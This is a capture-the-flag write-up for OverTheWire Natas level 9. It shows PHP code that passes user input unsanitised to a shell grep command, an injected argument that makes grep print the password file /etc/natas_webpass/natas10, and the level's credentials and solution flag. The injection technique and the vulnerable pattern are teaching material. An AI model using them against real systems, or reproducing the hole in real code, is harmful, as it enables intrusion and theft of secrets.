# Natas Level 9

Access data:

    username: natas9
    password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

Connect to the service using basic HTTP auth by replacing the credentials in the link:
    
    http://*USERNAME*:*FLAG*@*USERNAME*.natas.labs.overthewire.org/

Another form field, another source code:

```php
    <?
    $key = "";

    if(array_key_exists("needle", $_REQUEST)) {
        $key = $_REQUEST["needle"];
    }

    if($key != "") {
        passthru("grep -i $key dictionary.txt");
    }
    ?>
```

Obviously we can influence the command being executed in a shell (passthru). We need it to dump out our password - we know from previous challenges (Level 7) that it should reside in /etc/natas_webpass/natas10. 

We can just make grep to include another file (the password file) and search for a pattern that is likely to be contained and it will dump out the solution.

One input solution would be _a /etc/natas_webpass/natas10_

which leads to _grep -i a /etc/natas_webpass/natas10 dictionary.txt

Because an 'a' is contained in our flag, it is dumped out.

<details>
  <summary>Solution</summary>
  Flag: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
</details>